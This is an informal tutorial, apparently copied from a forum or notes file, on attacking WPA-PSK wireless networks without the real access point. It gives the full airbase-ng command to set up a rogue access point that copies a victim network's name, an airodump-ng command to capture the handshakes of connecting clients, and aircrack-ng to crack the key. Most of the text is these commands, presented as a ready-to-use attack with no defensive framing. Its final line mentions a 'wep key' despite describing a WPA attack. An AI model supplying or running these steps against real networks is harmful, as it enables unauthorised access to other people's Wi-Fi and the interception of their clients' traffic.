... wpa psk attack without the actual ap.
...
... say a client which used wpa psk to connect to an ap. now we can create
... one fake ap with the same name and wpa psk authentication.
... now when any previous client try to connect this ap wpa psk attack will
... on them and finally crack the key from stored file.

... to create one fake or rouge access point we do the following.
... to create one ap we will use the following options.

  Options:

      -a bssid         : set Access Point MAC address
      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: auto)
      -v               : verbose (print more messages)
      -c channel       : sets the channel the AP is running on

 # airbase-ng -c 3 -a aa:bb:cc:dd:ee:ff -e "Rokeya" -W 1 -z 2 wlan0mon

... here we have created one fake ap with the essid Rokeya and instruckted
... ap to accept the wpa psk TKIP authentication. when any client connects
... with this ap we can see from the output.
... on another window we will run the airodump-ng to capture the packets

 # airodump-ng -c 3 --bssid aa:bb:cc:dd:ee:ff --write wpa_psk_without_ap wlan0mon

... once the client connect to this ap it will start attack and start
... capturing the file. from the file we can crack the key using the aircrack-ng

 # aircrack-ng wpa_psk_without_ap.cap

... we can see the wep key if it is captured during the packets capturing sessions.
